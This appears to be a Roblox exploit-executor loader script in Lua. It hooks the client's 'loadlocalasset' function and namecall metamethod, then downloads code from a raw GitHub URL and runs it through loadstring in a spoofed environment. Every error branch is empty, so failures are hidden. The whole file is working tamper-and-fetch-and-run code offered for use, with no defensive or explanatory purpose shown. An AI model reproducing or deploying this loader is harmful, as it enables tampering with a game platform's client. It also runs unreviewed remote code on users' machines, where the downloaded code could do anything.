
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
while not localPlayer do
    task.wait(0.1)
    localPlayer = Players.LocalPlayer
end

local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
while not character or not character.Parent do
    task.wait(0.1)
    character = localPlayer.Character
end

local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
local coreGui = game:GetService("CoreGui")

local physicalFakeScript = Instance.new("LocalScript")
physicalFakeScript.Name = "HardcoreMode_Main"
physicalFakeScript.Parent = playerGui or coreGui

local fake = function(...)
    local args = {...}
    local asset = args[1]
    
    if typeof(asset) == "Instance" and args[2] then
        asset = args[2]
    end

    if asset then
        if getcustomasset then
            local success, custom = pcall(getcustomasset, asset)
            if success and custom then
                return custom
            end
        end
        return asset
    end
    return nil
end

getgenv().loadlocalasset = fake
getgenv().LoadLocalAsset = fake

pcall(function()
    if hookfunction and loadlocalasset then hookfunction(loadlocalasset, fake) end
    if hookfunction and LoadLocalAsset then hookfunction(LoadLocalAsset, fake) end
end)

if getrenv then
    pcall(function()
        getrenv().loadlocalasset = fake
        getrenv().LoadLocalAsset = fake
    end)
end

local old
old = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if tostring(method):lower() == "loadlocalasset" then
        return fake(self, ...)
    end
    return old(self, ...)
end)

local success, rawCode = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/iccdjkkkkskskhdgdgegvbfbgncjjdudejdjvi/REBLAHARDCOREDI/refs/heads/main/3ARCHITECTS")
end)

if not success or not rawCode then
end

local chunk, compileErr = loadstring(rawCode)
if not chunk then
end

local nuclearEnv = setmetatable({}, {
    __index = function(t, k)
        if k == "script" then
            return physicalFakeScript
        end
        return getgenv()[k] or shared[k] or _G[k] or getfenv(0)[k]
    end,
    __newindex = function(t, k, v)
        getgenv()[k] = v
    end
})

setfenv(chunk, nuclearEnv)

task.wait(0.5)

local runSuccess, runError = pcall(chunk)
if not runSuccess then
end